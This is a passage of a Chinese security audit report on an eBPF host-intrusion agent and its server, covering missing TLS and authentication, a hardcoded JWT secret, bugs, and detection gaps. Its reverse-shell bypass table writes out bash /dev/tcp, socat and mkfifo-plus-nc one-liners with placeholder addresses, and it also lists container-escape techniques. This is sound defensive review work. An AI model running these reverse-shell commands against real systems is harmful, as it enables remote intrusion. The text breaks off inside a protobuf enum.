# Agent & HCIDS 代码安全审查报告

**审查日期**: 2026-03-20
**审查范围**: Agent（客户端）全部源码 + HCIDS（服务端）全部源码
**审查重点**: 安全缺陷、功能缺陷、检测能力缺失、代码质量问题

---

## 目录

- [一、安全缺陷（5项）](#一安全缺陷5项)
  - [SEC-01: gRPC 通信无 TLS 加密](#sec-01-grpc-通信无-tls-加密)
  - [SEC-02: Agent 连接无身份认证](#sec-02-agent-连接无身份认证)
  - [SEC-03: JWT 密钥硬编码](#sec-03-jwt-密钥硬编码)
  - [SEC-04: CORS 配置不安全](#sec-04-cors-配置不安全)
  - [SEC-05: 数据库默认密码为空](#sec-05-数据库默认密码为空)
- [二、功能缺陷（7项）](#二功能缺陷7项)
  - [BUG-01: Perf 事件丢失仅记录日志](#bug-01-perf-事件丢失仅记录日志)
  - [BUG-02: NIDS AttackTracker 内存泄漏](#bug-02-nids-attacktracker-内存泄漏)
  - [BUG-03: /etc/passwd 每次调用重新读取无缓存](#bug-03-etcpasswd-每次调用重新读取无缓存)
  - [BUG-04: 端口解析错误被忽略](#bug-04-端口解析错误被忽略)
  - [BUG-05: DataType 常量客户端服务端未共享](#bug-05-datatype-常量客户端服务端未共享)
  - [BUG-06: bind/accept 事件采集后丢弃](#bug-06-bindaccept-事件采集后丢弃)
  - [BUG-07: connect 事件非恶意时不上报](#bug-07-connect-事件非恶意时不上报)
- [三、检测能力缺失（6项）](#三检测能力缺失6项)
  - [GAP-01: 反弹 Shell 检测可被绕过](#gap-01-反弹-shell-检测可被绕过)
  - [GAP-02: 容器逃逸检测不完整](#gap-02-容器逃逸检测不完整)
  - [GAP-03: 无文件写入内容监控](#gap-03-无文件写入内容监控)
  - [GAP-04: 仅支持 IPv4](#gap-04-仅支持-ipv4)
  - [GAP-05: DNS-over-HTTPS 可绕过 DNS 检测](#gap-05-dns-over-https-可绕过-dns-检测)
  - [GAP-06: NIDS 仅支持 HTTP 协议](#gap-06-nids-仅支持-http-协议)
- [四、代码质量问题（3项）](#四代码质量问题3项)
  - [QA-01: 服务端缺少容器逃逸处理分支](#qa-01-服务端缺少容器逃逸处理分支)
  - [QA-02: 数据类型常量未在客户端服务端间共享](#qa-02-数据类型常量未在客户端服务端间共享)
  - [QA-03: 服务端关闭顺序存在问题](#qa-03-服务端关闭顺序存在问题)
- [五、集成测试结果](#五集成测试结果)
- [六、总结与建议](#六总结与建议)

---

## 一、安全缺陷（5项）

### SEC-01: gRPC 通信无 TLS 加密

| 属性 | 值 |
|------|-----|
| **严重级别** | 严重 (Critical) |
| **文件路径** | `agent/transport/connection.go` |
| **行号** | 25-30 |
| **影响** | Agent 与 Server 之间所有通信（含安全告警、资产信息、命令下发）均以明文传输，可被中间人监听、篡改 |

**问题代码:**

```go
// dialOptions gRPC 连接选项（无 TLS 加密）
dialOptions = []grpc.DialOption{
    grpc.WithTransportCredentials(insecure.NewCredentials()), // 无 TLS 加密
    grpc.WithStatsHandler(&DefaultStatsHandler),              // 流量统计
    grpc.WithBlock(), // 阻塞直到连接建立
}
```

**风险分析:**

1. **数据泄露**: 安全告警数据（进程信息、网络连接、文件操作）均为明文传输，攻击者可在网络层嗅探获取主机安全状态
2. **中间人攻击**: 攻击者可篡改 Server 下发给 Agent 的命令（如扫描任务、配置更新），实现远程代码执行
3. **命令注入**: Server 下发的 Task 中包含 `data` 字段（JSON 格式），被篡改后可控制 Agent 行为
4. **Agent 冒充**: 无 TLS 双向认证，任何知道 Server 地址的客户端均可伪装成合法 Agent

**建议修复:**

- 启用 mTLS（双向 TLS），Agent 和 Server 各持证书
- 在 `dialOptions` 中使用 `grpc.WithTransportCredentials(credentials.NewTLS(tlsConfig))`
- 服务端使用 `grpc.Creds(credentials.NewTLS(tlsConfig))`

---

### SEC-02: Agent 连接无身份认证

| 属性 | 值 |
|------|-----|
| **严重级别** | 严重 (Critical) |
| **文件路径** | `server/internal/grpc/handler/transfer.go` |
| **行号** | 390-410 |
| **影响** | 任意客户端只需提供一个 agentID 字符串即可接入服务端，无需任何身份验证 |

**问题代码:**

```go
func (s *TransferServer) Transfer(stream proto.Transfer_TransferServer) error {
    // 1. 先接收第一个包，获取 AgentID
    pkg, err := stream.Recv()
    if err != nil {
        log.Errorf("[Transfer] 接收首包失败: %v", err)
        return err
    }

    agentID := pkg.AgentId
    if agentID == "" {
        log.Warnf("[Transfer] 首包缺少 agent_id")
        return io.EOF
    }

    // 2. 创建 channel 并注册 Agent
    commandCh := make(chan *proto.Command, 100)
    s.registerAgent(pkg, commandCh)
```

**风险分析:**

1. **伪造 Agent**: 攻击者可构造任意 agentID 接入 Server，发送虚假安全告警数据污染数据库
2. **替换合法 Agent**: 使用已知 agentID 连接后，可接收 Server 下发给该 Agent 的命令和配置
3. **拒绝服务**: 大量伪造 Agent 连接可耗尽 Server 的 goroutine 和内存资源
4. **数据投毒**: 伪造的告警数据混入真实数据后，降低安全运营人员对告警的信任度

**建议修复:**

- 实现基于 token/证书的 Agent 认证机制
- 在 gRPC 拦截器（UnaryInterceptor/StreamInterceptor）中验证认证信息
- 服务端维护 Agent 白名单或注册机制

---

### SEC-03: JWT 密钥硬编码

| 属性 | 值 |
|------|-----|
| **严重级别** | 高 (High) |
| **文件路径** | `server/internal/config/config.go` |
| **行号** | 145-148 |
| **影响** | HTTP API 的 JWT 认证可被绕过 |

**问题代码:**

```go
JWT: JWTConfig{
    Secret:      "server-default-jwt-secret",
    ExpireHours: 24,
},
```

**风险分析:**

1. **认证绕过**: 源码公开后，任何人可使用该密钥伪造合法 JWT token 访问所有 HTTP API
2. **权限提升**: 伪造的 token 可包含管理员权限声明，直接获取最高权限
3. **默认密钥未强制修改**: 配置文件中无校验逻辑强制用户修改默认密钥

**建议修复:**

- 启动时检测是否使用默认密钥，若是则拒绝启动或输出严重警告
- 使用随机生成的密钥或从环境变量/密钥管理服务获取
- 在 `config.Validate()` 中添加密钥长度和复杂度检查

---

### SEC-04: CORS 配置不安全

| 属性 | 值 |
|------|-----|
| **严重级别** | 高 (High) |
| **文件路径** | `server/internal/config/config.go` |
| **行号** | 139-144 |
| **影响** | 允许任意域的跨域请求携带凭证，可导致 CSRF 和数据泄露 |

**问题代码:**

```go
CORS: CORSConfig{
    AllowedOrigins:   []string{"*"},
    AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
    AllowedHeaders:   []string{"Origin", "Content-Type", "Accept", "Authorization", "X-Requested-With"},
    AllowCredentials: true,
},
```

**风险分析:**

1. **CSRF 攻击**: `AllowedOrigins: ["*"]` 与 `AllowCredentials: true` 组合违反 CORS 规范（浏览器会拒绝），但某些非浏览器客户端可能不受限制
2. **凭证泄露**: 若浏览器实现有缺陷或使用了非标准客户端，cookie 和 Authorization 头可被任意源读取
3. **数据窃取**: 恶意网页可通过 AJAX 请求读取 HCIDS API 返回的敏感安全数据

**建议修复:**

- `AllowedOrigins` 改为具体的前端域名列表
- 若必须使用通配符，则将 `AllowCredentials` 设为 `false`
- 添加 CORS 配置合规性检查

---

### SEC-05: 数据库默认密码为空

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `server/internal/config/config.go` |
| **行号** | 150-158 |
| **影响** | 默认配置下数据库无密码保护 |

**问题代码:**

```go
Database: DatabaseConfig{
    Host:         "localhost",
    Port:         5432,
    User:         "postgres",
    Password:     "",
    Database:     "server",
    PoolSize:     10,
    GormLogLevel: "error",
},
```

**风险分析:**

1. **数据库未授权访问**: 若用户未修改默认配置且 PostgreSQL 允许空密码连接，则任何可访问数据库端口的用户均可直接操作数据库
2. **数据篡改/删除**: 直接访问数据库可修改或删除所有安全告警记录
3. **生产环境遗忘**: 实际部署配置中密码设为 `"root"`（见 `/opt/cloudsec/server/conf/server.yaml:38`），虽非空但仍为弱密码

**建议修复:**

- 启动时校验数据库密码不为空且不为常见弱密码
- 在文档中强调必须修改默认密码
- 支持从环境变量读取密码，避免明文写入配置文件

---

## 二、功能缺陷（7项）

### BUG-01: Perf 事件丢失仅记录日志

| 属性 | 值 |
|------|-----|
| **严重级别** | 高 (High) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/main.go` |
| **行号** | 192-194 |
| **影响** | 高负载场景下 eBPF 事件丢失不被告警，安全检测可能出现盲区 |

**问题代码:**

```go
if rec.LostSamples > 0 {
    logger.Warn("Lost samples", "count", rec.LostSamples, "cpu", rec.CPU)
}
```

**问题分析:**

1. **丢失事件不告警**: Perf buffer 满载时丢弃的事件仅以 WARN 级别记录本地日志，Server 端无感知
2. **安全盲区**: 攻击者可通过制造大量 noise 事件（如大量 exec/connect）触发 perf buffer 溢出，使真正的恶意事件被丢弃
3. **Perf buffer 容量固定**: `perf.NewReader(objs.Events, 32*4096)` 固定为每 CPU 128KB（`ebpf/loader.go:173`），对于高负载主机可能不够
4. **无自适应机制**: 缺乏根据事件速率动态调整缓冲区大小或采样率的机制

**建议修复:**

- 将 LostSamples 计数上报到 Server，作为 Agent 健康指标
- 累计丢失事件超过阈值时生成系统告警
- 提供配置项允许调整 perf buffer 大小
- 实现事件采样或优先级机制，确保高优先级事件（如反弹 shell）不被丢弃

---

### BUG-02: NIDS AttackTracker 内存泄漏

| 属性 | 值 |
|------|-----|
| **严重级别** | 高 (High) |
| **文件路径** | `agent/business_plugins/nids/tracker.go` |
| **行号** | 16-26 |
| **影响** | 长时间运行后内存无限增长，最终可能导致 OOM |

**问题代码:**

```go
type AttackTracker struct {
    mu     sync.RWMutex
    states map[string]*AttackState // key: "srcIP:sid"
}

func NewAttackTracker() *AttackTracker {
    return &AttackTracker{
        states: make(map[string]*AttackState),
    }
}
```

**问题分析:**

1. **无清理机制**: `states` map 中的 `AttackState` 条目只增不减，永远不会被清理
2. **key 无限增长**: key 格式为 `"srcIP:sid"`，遭受大量不同源 IP 攻击时条目数量线性增长
3. **无 TTL**: 即使攻击停止数小时/数天，其状态仍占用内存
4. **无数量限制**: 没有最大条目数限制

**建议修复:**

- 添加后台 goroutine 定期清理过期条目（如最后活跃时间超过 1 小时的条目）
- 设置 map 最大容量，达到上限时使用 LRU 策略淘汰
- 或使用带 TTL 的缓存库（如 `patrickmn/go-cache`）替代原始 map

---

### BUG-03: /etc/passwd 每次调用重新读取无缓存

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/proc.go` |
| **行号** | 54-71 |
| **影响** | 高频事件处理时产生大量文件 I/O，影响性能 |

**问题代码:**

```go
func resolveUsername(uid uint32) string {
    uidStr := fmt.Sprintf("%d", uid)
    f, err := os.Open("/etc/passwd")
    if err != nil {
        return uidStr
    }
    defer f.Close()
    scanner := bufio.NewScanner(f)
    for scanner.Scan() {
        line := scanner.Text()
        parts := strings.Split(line, ":")
        if len(parts) >= 3 && parts[2] == uidStr {
            return parts[0]
        }
    }
    return uidStr
}
```

**问题分析:**

1. **每次调用都打开并逐行扫描 /etc/passwd**: 每个 execve/connect/file 事件触发一次该函数
2. **高负载场景**: 繁忙主机可能每秒数百到数千个 execve 事件，每个都会触发完整的文件读取
3. **文件描述符开销**: 频繁 open/close 操作增加系统调用开销
4. **同样的问题也存在于 `resolveParentComm`、`resolveExePath` 等函数**: 每次调用都读取 `/proc/[pid]/comm`、`/proc/[pid]/exe`

**建议修复:**

- 添加 UID → username 的内存缓存（`sync.Map` 或带 TTL 的 cache）
- 启动时预加载 `/etc/passwd`，监听 inotify 事件在文件变更时刷新缓存
- 或使用 `os/user.LookupId()` 标准库（内部有缓存）

---

### BUG-04: 端口解析错误被忽略

| 属性 | 值 |
|------|-----|
| **严重级别** | 低 (Low) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/malicious_request_detector.go` |
| **行号** | 71-75 |
| **影响** | 无效的端口配置值被静默忽略，可能导致规则不生效 |

**问题代码:**

```go
case MaliciousRequestTypePort:
    for _, portStr := range rule.Indicators {
        port, _ := strconv.Atoi(portStr)
        m.portIndex[uint16(port)] = rule
    }
```

**问题分析:**

1. **错误被忽略**: `strconv.Atoi` 的 error 返回值被 `_` 丢弃
2. **无效值变为 0**: 解析失败时 `port` 值为 0，`uint16(0)` 会将端口 0 加入索引
3. **误报风险**: 若有进程连接端口 0（虽然极少见），会触发误报
4. **配置问题难以排查**: 管理员配置了无效端口字符串（如 `"abc"` 或 `"99999"`）时不会收到任何错误提示

**建议修复:**

```go
port, err := strconv.Atoi(portStr)
if err != nil || port < 1 || port > 65535 {
    logger.Warn("Invalid port in rule", "rule_id", rule.ID, "port", portStr, "error", err)
    continue
}
m.portIndex[uint16(port)] = rule
```

---

### BUG-05: DataType 常量客户端服务端未共享

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | 多处（见下方） |
| **影响** | 客户端和服务端的 DataType 常量分别定义，存在不一致风险 |

**相关代码位置:**

- **服务端**: `server/internal/grpc/handler/transfer.go:32-88` 定义了完整的 DataType 常量
- **Agent 各插件**: 各自硬编码 DataType 值
  - `agent/business_plugins/detector/main.go:23-32` 使用 `6010`、`6011`
  - `agent/business_plugins/ebpf_base_detector/event_handlers.go` 使用各种 DataType 值
  - `agent/business_plugins/nids/` 使用 `6007`
  - `agent/business_plugins/scanner/` 使用 `6061`、`6062`

**问题分析:**

1. **无单一事实源**: 同一个 DataType 值在多处分别定义，修改时需要同步更新所有位置
2. **不一致风险**: 如某个插件使用了与 Server 不同的 DataType 值，数据将进入 `default` 分支被记录为 "未知类型"
3. **proto 文件未定义**: `proto/grpc.proto` 中未定义 DataType 枚举，缺少协议级别的约束

**建议修复:**

- 在 `proto/grpc.proto` 中定义 DataType 枚举
- 或创建共享的 Go 常量包，供 Agent 和各插件引用
- 服务端 `processPayload` 的 default 分支应记录更详细的信息（包含 DataType 值）以便排查不一致问题

---

### BUG-06: bind/accept 事件采集后丢弃

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/event_handlers.go` |
| **行号** | 238-263 |
| **影响** | eBPF 内核程序采集了 bind 和 accept 事件，消耗 perf buffer 和 CPU 资源，但用户态完全不处理 |

**问题代码:**

```go
func handleBind(ctx *eventHandlerCtx, raw []byte) error {
    var evt events.BindEvent
    if err := evt.UnmarshalBinary(raw); err != nil {
        return fmt.Errorf("unmarshal bind event: %w", err)
    }
    //record := evt.ToRecord()
    //ctx.logger.Info("Bind event",
    //  "pid", evt.PID, "comm", cstring(evt.Comm[:]),
    //  "bind_ip", record.Data.Fields["bind_ip"], "bind_port", record.Data.Fields["bind_port"],
    //  "protocol", record.Data.Fields["protocol"])
    return nil
}

func handleAccept(ctx *eventHandlerCtx, raw []byte) error {
    var evt events.AcceptEvent
    if err := evt.UnmarshalBinary(raw); err != nil {
        return fmt.Errorf("unmarshal accept event: %w", err)
    }
    evt.ToRecord()
    // record := evt.ToRecord()
    // ctx.logger.Info("Accept event", ...)
    return nil
}
```

**问题分析:**

1. **资源浪费**: eBPF 内核程序仍在 tracing bind/accept 系统调用，每个事件都写入 perf buffer
2. **增加丢失风险**: 无用事件占用 perf buffer 空间，增加了有价值事件（execve, connect, file）被丢弃的概率
3. **代码被注释**: 处理逻辑全被注释，说明是开发中遗留的半成品

**建议修复:**

- **方案 A**: 在 eBPF C 代码中禁用 bind/accept 探针，减少内核开销
- **方案 B**: 恢复事件处理逻辑，将 bind 事件用于端口监听检测（如发现后门监听端口）、accept 事件用于入站连接审计

---

### BUG-07: connect 事件非恶意时不上报

| 属性 | 值 |
|------|-----|
| **严重级别** | 低 (Low) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/event_handlers.go` |
| **行号** | 213-236 |
| **影响** | 服务端数据库 connect 表仅包含恶意连接记录，缺少行为基线数据 |

**问题代码:**

```go
func handleConnect(ctx *eventHandlerCtx, raw []byte) error {
    var evt events.ConnectEvent
    if err := evt.UnmarshalBinary(raw); err != nil {
        return fmt.Errorf("unmarshal connect event: %w", err)
    }
    // 注释掉的通用上报逻辑
    //record := evt.ToRecord()
    //ctx.logger.Info("Connect event", ...)

    if ctx.mrDetector != nil {
        if mrResult := ctx.mrDetector.MatchConnect(&evt); mrResult != nil {
            mrRecord := BuildMaliciousRequestConnectRecord(&evt, mrResult)
            // ... 仅上报恶意匹配的连接
            if err := ctx.client.SendRecord(mrRecord); err != nil {
                ctx.logger.Error("Failed to send malicious request connect record to agent", "error", err)
            }
        }
    }
    return nil
}
```

**问题分析:**

1. **缺少行为基线**: 服务端 `connect` 表（`server/internal/grpc/handler/transfer.go:657`）有处理函数 `processConnect`，但 Agent 只在检测到恶意连接时才上报，正常连接不会入库
2. **无法做行为分析**: 缺少正常连接数据，无法建立网络行为基线，也无法做回溯分析（如事后发现某 IP 为恶意时，无法查询历史连接记录）
3. **与 execve 处理不一致**: execve 事件同时上报原始事件和告警，但 connect 只上报告警

**建议修复:**

- 恢复通用 connect 事件上报（注释掉的 `record := evt.ToRecord()` 部分）
- 在 Server 端提供行为分析功能，基于 connect 历史数据检测异常外连模式
- 注意：全量上报可能数据量较大，可通过采样或聚合方式控制

---

## 三、检测能力缺失（6项）

### GAP-01: 反弹 Shell 检测可被绕过

| 属性 | 值 |
|------|-----|
| **严重级别** | 高 (High) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/reverse_shell.go` |
| **行号** | 25-58 |
| **影响** | 多种常见反弹 Shell 技术可绕过检测 |

**当前检测逻辑:**

```go
func (d *ReverseShellDetector) Detect(evt *events.ExecveEvent) *ReverseShellResult {
    ttyName := cstring(evt.TTYName[:])

    // 规则1: stdin 是 socket（bit 0）
    if evt.FDType&1 != 0 {
        return &ReverseShellResult{
            RuleName:    "stdin_socket",
            Confidence:  "high",
            Description: "stdin (fd 0) is connected to a socket",
        }
    }

    // 规则2: stdout 是 socket（bit 1）
    if evt.FDType&2 != 0 {
        return &ReverseShellResult{
            RuleName:    "stdout_socket",
            Confidence:  "high",
            Description: "stdout (fd 1) is connected to a socket",
        }
    }

    // 规则3: 无 TTY + 有 socket 连接
    if ttyName == "" && evt.SocketPID > 0 {
        return &ReverseShellResult{
            RuleName:    "no_tty_with_socket",
            Confidence:  "medium",
            Description: "process has no controlling terminal but parent chain has active socket",
        }
    }

    return nil
}
```

**可绕过的技术:**

| 绕过方式 | 原理 | 是否可检测 |
|----------|------|-----------|
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | stdin+stdout 重定向到 socket | 可检测 |
| `python -c 'import pty; ...; os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)'` | 三个 FD 都指向 socket | 可检测（stdin/stdout） |
| `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT` | 通过 PTY 间接连接，stdin/stdout 指向 PTY 而非 socket | **无法检测**（stdin 是 pty 非 socket） |
| `python -c 'import pty; pty.spawn("/bin/bash")'` 配合 nc | 通过 PTY spawn，进程有 tty | **无法检测**（有 tty 且 stdin 非 socket） |
| `openssl s_client -connect IP:PORT` 配合 bash | 通过 SSL pipe 传输 | **无法检测**（stdin 是 pipe 非 socket） |
| 使用 `mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc IP PORT > /tmp/f` | 通过命名管道中转 | **无法检测**（stdin/stdout 是 pipe 非 socket） |
| stderr (fd 2) 重定向到 socket | 仅检查 bit 0 和 bit 1，不检查 bit 2 | **无法检测** |

**建议增强:**

- 增加 stderr (fd 2) 的 socket 检测（FDType bit 2）
- 增加 pipe + socket 组合检测（stdin 是 pipe 且进程树中有 socket）
- 增加 PTY 异常检测（进程的 PTY 是通过 socket 连接的远程 PTY）
- 增加命令模式匹配（如 `bash -i`、`/dev/tcp/`、`mkfifo` + `nc` 组合）
- 检测 execve 参数中包含 `/dev/tcp/`、`dup2`、`socket` 等关键字

---

### GAP-02: 容器逃逸检测不完整

| 属性 | 值 |
|------|-----|
| **严重级别** | 高 (High) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/container_escape.go` |
| **行号** | 1-64（全文件） |
| **影响** | 仅检测一种容器逃逸向量，主流逃逸方式均可绕过 |

**当前检测范围:**

```go
var blockDevicePrefixes = []string{
    "/dev/sd",   // SCSI/SATA 设备
    "/dev/vd",   // VirtIO 设备
    "/dev/nvme", // NVMe 设备
    "/dev/xvd",  // Xen 设备
    "/dev/hd",   // IDE 设备
}

func (d *ContainerEscapeDetector) DetectMountEscape(evt *events.MountEvent) *EscapeResult {
    // 条件1: 必须在容器内
    if !IsContainer(evt.MntnsID, evt.RootMntnsID) {
        return nil
    }
    // 条件2: 挂载源是宿主机块设备
    for _, prefix := range blockDevicePrefixes {
        if strings.HasPrefix(devName, prefix) {
            isBlockDevice = true
            break
        }
    }
    // ...
}
```

**未覆盖的逃逸向量:**

| 逃逸类型 | 技术细节 | CVE 参考 |
|----------|---------|---------|
| **cgroup 逃逸** | 通过 cgroup v1 release_agent 写入实现宿主机命令执行 | CVE-2022-0492 |
| **特权容器逃逸** | `--privileged` 容器可直接挂载宿主机 `/` 或访问所有设备 | - |
| **runc 漏洞** | 通过 `/proc/self/exe` 覆写 runc 二进制 | CVE-2019-5736 |
| **内核漏洞提权** | 容器内利用内核漏洞提权后逃逸 | DirtyPipe, DirtyCoW 等 |
| **Docker Socket 挂载** | 挂载 `/var/run/docker.sock` 后创建特权容器 | - |
| **procfs/sysfs 挂载** | 通过挂载 `/proc` 或 `/sys` 访问宿主机信息 | - |
| **Namespace 穿越** | 通过 `nsenter` 或 `setns` 系统调用切换到宿主机 namespace | - |

**建议增强:**

- 检测 cgroup release_agent 写入
- 检测 Docker socket 文件操作
- 检测 `nsenter` 和 `setns` 系统调用
- 检测容器内对 `/proc/1/root` 的访问
- 检测容器内对 `/proc/sysrq-trigger` 的写入
- 检测容器内加载内核模块的尝试（`insmod`/`modprobe`）

---

### GAP-03: 无文件写入内容监控

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/ebpf/bpf/types.h` |
| **行号** | 130-155（file_event struct） |
| **影响** | 仅检测文件路径操作，无法检测文件内容变更 |

**当前 file_event 结构体:**

```c
struct file_event {
    __u8  event_type;     // EVENT_TYPE_FILE = 6
    __u8  op;             // 操作类型 (create/delete/rename/link/chmod/chown)
    __u8  padding1[2];
    __u32 pid;
    __u32 tgid;
    __u32 ppid;
    __u32 uid;
    __u32 mntns_id;
    __u32 root_mntns_id;
    char  comm[16];
    char  exe_path[256];
    char  file_path[256];
    char  new_path[256];  // rename/link 的目标路径
} __attribute__((packed));
```

**缺失的检测场景:**

1. **Webshell 写入**: 攻击者将 webshell 内容写入 `.php`/`.jsp` 文件，仅靠路径无法判断
2. **SSH 后门**: 向 `~/.ssh/authorized_keys` 追加公钥
3. **定时任务后门**: 向 crontab 文件写入恶意命令
4. **配置篡改**: 修改 `/etc/sudoers`、`/etc/pam.d/` 等配置内容
5. **当前只检测元数据操作**: create、delete、rename、link、chmod、chown，不包含 write

**建议增强:**

- 对高价值文件（如 authorized_keys、crontab、sudoers）的 write 操作增加 hook
- 实现选择性的文件内容采集（仅对敏感路径，且限制采集长度）
- 或在 write 操作后触发文件 hash 校验对比

---

### GAP-04: 仅支持 IPv4

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/ebpf/bpf/types.h` |
| **行号** | 95-111（connect_event）, 158-173（dns_event） |
| **影响** | IPv6 环境下的网络事件无法被检测 |

**问题代码:**

```c
struct connect_event {
    // ...
    __u32 remote_ip;      // 目标 IP（网络字节序）—— 仅 32 位，IPv4 only
    __u16 remote_port;
    __u16 local_port;
    __u32 local_ip;       // 本地 IP（网络字节序）—— 仅 32 位，IPv4 only
    // ...
};

struct dns_event {
    // ...
    __u32 dns_server_ip;  // DNS 服务器 IP —— 仅 32 位，IPv4 only
    // ...
};
```

**影响范围:**

1. **connect 事件**: IPv6 外连不被捕获，攻击者使用 IPv6 地址的 C2 服务器可完全规避检测
2. **DNS 事件**: IPv6 DNS 服务器的查询不被记录
3. **恶意请求检测**: `malicious_request_detector.go` 的 IP 匹配仅支持 IPv4 地址
4. **现代云环境**: AWS、GCP 等云平台默认启用双栈（IPv4+IPv6），仅监控 IPv4 存在盲区

**建议修复:**

- 将 IP 字段扩展为 128 位（`__u8 remote_ip[16]`），同时支持 IPv4-mapped IPv6 地址
- 在 eBPF 程序中同时 hook `AF_INET` 和 `AF_INET6` 的 connect 系统调用
- 用户态解析时根据地址族区分 IPv4/IPv6 地址格式

---

### GAP-05: DNS-over-HTTPS 可绕过 DNS 检测

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `agent/business_plugins/ebpf_base_detector/event_handlers.go` |
| **行号** | handleDNS 函数 |
| **影响** | 使用 DoH/DoT 的恶意软件可完全绕过 DNS 域名检测 |

**当前 DNS 检测原理:**

eBPF 内核程序通过 hook UDP 端口 53 的 DNS 查询报文，解析 DNS 协议获取查询域名，然后与恶意域名规则库匹配。

**绕过方式:**

| 方式 | 协议 | 端口 | 是否被检测 |
|------|------|------|-----------|
| 标准 DNS | UDP | 53 | 可检测 |
| DNS over TLS (DoT) | TCP+TLS | 853 | **不可检测** |
| DNS over HTTPS (DoH) | HTTPS | 443 | **不可检测** |
| DNS over QUIC (DoQ) | QUIC | 443/8853 | **不可检测** |

**现实威胁:**

- 越来越多的恶意软件使用 DoH 进行 C2 通信（如 Godlua、DNSMessenger）
- Firefox、Chrome 等浏览器已默认支持 DoH
- Cloudflare（1.1.1.1）、Google（8.8.8.8）均提供 DoH 服务

**建议增强:**

- 检测对已知 DoH 服务器的 HTTPS 连接（如 1.1.1.1/dns-query、8.8.8.8/dns-query）
- 在 NIDS 层对 HTTPS 流量进行 SNI 检查
- 检测进程是否链接了 DoH 相关库

---

### GAP-06: NIDS 仅支持 HTTP 协议

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `agent/business_plugins/nids/http_parser.go`, `nids/main.go` |
| **行号** | http_parser.go 全文件, main.go:54-64 |
| **影响** | 仅能检测 HTTP 层攻击，其他协议攻击完全无法检测 |

**当前 NIDS 架构:**

```
libpcap 抓包 → TCP 重组 → HTTP 协议解析 → Suricata 规则匹配
```

```go
// http_parser.go
type HTTPRequest struct {
    SrcIP      string
    DstIP      string
    SrcPort    uint16
    DstPort    uint16
    Method     string
    URI        string
    Headers    string
    Body       []byte
    RawPayload string
}
```

**未覆盖的协议攻击:**

| 协议 | 攻击类型 | 实际威胁程度 |
|------|---------|-------------|
| DNS | DNS 隧道、DNS 放大攻击 | 高 |
| SMTP | 钓鱼邮件、恶意附件 | 高 |
| SSH | 协议层暴力破解、漏洞利用 | 中（已由 detector 插件在日志层检测） |
| FTP | 匿名登录、跳板攻击 | 中（已由 detector 插件在日志层检测） |
| HTTPS/TLS | TLS 降级攻击、SNI 检测 | 中 |
| LDAP | LDAP 注入、AD 枚举 | 中 |
| Redis/MySQL | 未授权访问、注入 | 中 |
| SMB | EternalBlue、远程代码执行 | 高 |

**建议增强:**

- 优先增加 TLS 层 SNI 提取（无需解密即可获取目标域名）
- 增加 DNS 协议解析（与 eBPF DNS 检测互补）
- 增加 SMB 协议检测（勒索软件常用传播方式）
- 长期规划：支持多协议解析框架

---

## 四、代码质量问题（3项）

### QA-01: 服务端缺少容器逃逸处理分支

| 属性 | 值 |
|------|-----|
| **严重级别** | 高 (High) |
| **文件路径** | `server/internal/grpc/handler/transfer.go` |
| **行号** | 641-717（processPayload switch 语句） |
| **影响** | Agent 检测到的容器逃逸告警无法被 Server 处理和入库 |

**问题分析:**

服务端定义了容器安全告警的 DataType 常量：

```go
// ===== 容器安全告警 (7001-7099) =====
const (
    dataTypeContainerDangerousCommand int32 = 7001 // 容器高危命令告警
    dataTypeContainerReverseShell     int32 = 7003 // 容器反弹Shell告警
    dataTypeContainerSensitiveFile    int32 = 7004 // 容器核心文件监控告警
)
```

但 switch 语句中**未定义** `dataTypeContainerEscape`（如 7002 或其他值），当 Agent 上报容器逃逸事件时，会进入 `default` 分支：

```go
default:
    log.Warnf("[Transfer]      [未知类型] fields=%v", fields)
```

也就是说：
1. Agent 的 `container_escape.go` 检测到逃逸并上报
2. Server 收到后当作 "未知类型" 丢弃，仅打印一条 WARN 日志
3. 数据库中无容器逃逸告警记录
4. 安全运营人员无法在管理界面看到这些告警

**建议修复:**

- 在服务端定义 `dataTypeContainerEscape` 常量
- 在 switch 中添加对应的 `case` 分支和 `processContainerEscape` 处理函数
- 创建 `alert_container_escape` 数据库表
- 确认 Agent 端上报时使用的 DataType 值与 Server 端一致

---

### QA-02: 数据类型常量未在客户端服务端间共享

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | 多处 |
| **影响** | 维护成本高，易出现不一致 |

**当前状况:**

DataType 常量在以下位置分别定义（未引用共同的源）：

| 位置 | 定义方式 | 示例 |
|------|---------|------|
| `server/internal/grpc/handler/transfer.go:32-88` | `const` 块 | `dataTypeDangerousCommand int32 = 6003` |
| `agent/business_plugins/ebpf_base_detector/event_handlers.go` | 分散在代码中 | 硬编码数字 |
| `agent/business_plugins/detector/main.go:23-32` | `const` 块 | `DetectorConfigUpdateDataType = int32(6010)` |
| `agent/business_plugins/nids/` | 分散在代码中 | 硬编码数字 |
| `agent/business_plugins/scanner/` | 分散在代码中 | 硬编码数字 |
| `proto/grpc.proto` | **未定义** | 无 DataType 枚举 |

**建议修复:**

在 `proto/grpc.proto` 中新增枚举定义，作为唯一事实源：

```protobuf
enum DataType {
    // 资产采集
    DATA_TYPE_PROCESS = 5050;
    DATA_TYPE_PORT = 5051;
    // ...
    // 安全告警
